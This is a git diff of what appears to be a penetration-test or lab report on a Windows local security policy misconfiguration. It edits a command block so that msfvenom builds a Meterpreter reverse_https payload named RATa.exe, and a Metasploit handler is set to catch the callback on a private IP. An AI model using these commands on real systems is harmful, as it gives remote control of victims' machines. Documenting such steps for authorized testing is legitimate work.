@@ -14,7 +14,7 @@ NOTES:
 
 -trying to test disabling script
 
-
+<img width="890" height="139" alt="image" src="https://github.com/user-attachments/assets/71141d52-0e1a-4c7d-9525-ff37611a40a9" />
 
 
 
@@ -32,13 +32,13 @@ The assessment identified a critical misconfiguration in the local security poli
 **Commands Used:**
 ```bash
 # Payload Generation
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.10 LPORT=443 -f exe -o payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=50500 -f exe -o RATa.exe
 
 # Listener Setup
 use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.50.10
-set LPORT 443
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.92.136
+set LPORT 50500
 run
 ```
 
